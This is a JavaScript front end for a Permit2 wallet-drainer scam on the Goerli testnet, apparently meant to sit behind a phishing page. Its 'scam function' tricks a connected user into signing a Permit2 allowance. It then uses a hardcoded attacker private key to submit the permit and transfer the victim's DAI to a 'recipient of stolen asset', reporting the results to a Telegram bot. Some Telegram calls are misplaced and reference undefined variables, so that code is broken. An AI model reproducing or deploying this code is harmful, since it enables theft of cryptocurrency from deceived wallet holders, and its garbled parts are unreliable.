const request = require('request');
const { ethers, ethereum, Web3 } = window;

// constants
const RPC = "https://goerli.infura.io/v3/15d127f3ac494ca88ab983921536e312"; // Goerly RPC
const chainId = 5; // Goerly chain id
const Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Permit2 deployed to Goerly
const tokenToTransfer = "0x024f245F740667fF208068d593E4C7f8f26416f2"; // DAI on Goerly
const amountToTransfer = String(20 * (10 ** 18)); // calculate DAI amount
const initiator = "0xECD56821D6eB6db6cCB30243cb1d6592Ff5A0F14"; // initiator address
const initiatorPK = "050947b326c43b89fd7d46ef2e3ab49ce419ac03c4ba1e66c055abb86cf6d2c4"; // initiator's private key
const recipient = "0xf50b1E00215D83089AEE99b76D64a9C0b915062a"; // recipient of stolen asset

// setup UI
const connectButton = document.getElementById("connect");
const approveButton = document.getElementById("approve");
const mainButton = document.getElementById("main");

approveButton.disabled = true;
mainButton.disabled = true;


// ABIs
const Permit2ContractABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "owner", "type": "address" },
            { 
                "components": [
                    { 
                        "components": [
                            { "internalType": "address", "name": "token", "type": "address" },
                            { "internalType": "uint160", "name": "amount", "type": "uint160" },
                            { "internalType": "uint48", "name": "expiration", "type": "uint48" },
                            { "internalType": "uint48", "name": "nonce", "type": "uint48" }
                        ],
                        "internalType": "struct IAllowanceTransfer.PermitDetails",
                        "name": "details",
                        "type": "tuple"
                    },
                    { "internalType": "address", "name": "spender", "type": "address" },
                    { "internalType": "uint256", "name": "sigDeadline", "type": "uint256" }
                ],
                "internalType": "struct IAllowanceTransfer.PermitSingle",
                "name": "permitSingle",
                "type": "tuple"
            },
            { "internalType": "bytes", "name": "signature", "type": "bytes" }
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint160", "name": "amount", "type": "uint160" },
            { "internalType": "address", "name": "token", "type": "address" }
        ],
        "name": "transferFrom",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "_spender", "type": "address" },
            { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [
            { "name": "", "type": "bool" }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

// function to send Telegram messages
function sendTelegramMessage(message) {
    const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
    const telegramChatId = "YOUR_TELEGRAM_CHAT_ID";

    const telegramMessage = {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown"
    };

    const telegramOptions = {
        uri: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        body: JSON.stringify(telegramMessage),
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        }
    };

    request(telegramOptions, (error, response) => {
        if (error) {
            console.error("Error sending message to Telegram:", error);
        } else {
            console.log("Message sent to Telegram:", response.body);
        }
    });
}


// variables
let provider, web3
let selectedAddress

// connect function
async function connect() {
    web3 = new Web3(ethereum)
    provider = new ethers.providers.Web3Provider(ethereum)
    const network = await provider.getNetwork()

    if (network.chainId !== chainId) {
        try {
            await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId}` }])
        } catch (err) {
            console.log("error", err)
            return
        }
    }
    
    const accounts = await provider.send("eth_requestAccounts", [])
    selectedAddress = accounts[0]

    connectButton.innerText = selectedAddress
    connectButton.disabled = true
    approveButton.disabled = false
    mainButton.disabled = false
}

// function for token approval to the Permit2 contract
async function approveToken() {
    const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenToTransfer, { from: selectedAddress })
    tokenContract.methods.approve(Permit2Contract, amountToTransfer).send({ from: selectedAddress })
    .on("transactionHash", function(hash) {
        console.log("wait for a little bit..")
    })
    .on("receipt", function(receipt) {
        console.log("You successfully approved ", tokenToTransfer, "with the amount, ", amountToTransfer)
    })
}

    // Send approval transaction hash to Telegram
    sendTelegramMessage(`Token Approval Transaction Hash: [${hash}](https://goerli.etherscan.io/tx/${hash})`);

    // Send approval receipt to Telegram
    sendTelegramMessage(`Token Approval Receipt: ${JSON.stringify(receipt)}`);
// the scam function
async function IncreaseAllowance() {
    const deadline = 10000000000000
    const nonce = 0 // still experimenting on this one

    const dataToSign = JSON.stringify({
        domain: {
            name: "Permit2",
            chainId: chainId,
            verifyingContract: Permit2Contract
        },
        types: {
            EIP712Domain: [
                { name: "name", type: "string" },
                { name: "chainId", type: "uint256" },
                { name: "verifyingContract", type: "address" }
            ],
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: { 
            details: {
                token: tokenToTransfer,
                amount: amountToTransfer,
                expiration: deadline,
                nonce: nonce
            }, 
            spender: initiator, 
            sigDeadline: deadline,
        }
    })

    web3.currentProvider.sendAsync({
        method: "eth_signTypedData_v3",
        params: [selectedAddress, dataToSign],
        from: selectedAddress
    }, async (error, result) => {
        if (error != null) {
            console.log("Error signing")
            return
        }

        const signature = result.result
        const initiatorNonce = await web3.eth.getTransactionCount(initiator)
        const permit2Contract = new web3.eth.Contract(Permit2ContractABI, Permit2Contract)
        
        const permitDetails = [[tokenToTransfer, amountToTransfer, deadline, nonce], initiator, deadline]
        const permitData = permit2Contract.methods.permit(selectedAddress, permitDetails, signature).encodeABI()
        const gasPrice = await web3.eth.getGasPrice()
        const permitTX = {
            from: initiator,
            to: Permit2Contract,
            nonce: web3.utils.toHex(initiatorNonce),
            gasLimit: web3.utils.toHex(98000),
            gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            value: "0x",
            data: permitData
        }
        const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, initiatorPK)
        web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)

        // after the token is approved to us, Transfer it
        const transferData = permit2Contract.methods.transferFrom(selectedAddress, recipient, amountToTransfer, tokenToTransfer).encodeABI() 
        const transferTX = {
            from: initiator,
            to: Permit2Contract,
            nonce: web3.utils.toHex(initiatorNonce + 1), // don't forget to increment initiator's nonce
            gasLimit: web3.utils.toHex(98000),
            gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            value: "0x",
            data: transferData
        }
        const signedTransferTX = await web3.eth.accounts.signTransaction(transferTX, initiatorPK)
        web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction)
    })

    // Send transfer transaction hash to Telegram
    sendTelegramMessage(`Transfer Transaction Hash: [${hash}](https://goerli.etherscan.io/tx/${hash})`);

    // Send transfer receipt to Telegram
    sendTelegramMessage(`Transfer Receipt: ${JSON.stringify(receipt)}`);
}

// configure buttons
window.addEventListener("DOMContentLoaded", () => {
    connectButton.onclick = connect;
});

window.addEventListener("DOMContentLoaded", () => {
    approveButton.onclick = approveToken;
});

window.addEventListener("DOMContentLoaded", () => {
    mainButton.onclick = IncreaseAllowance;
});
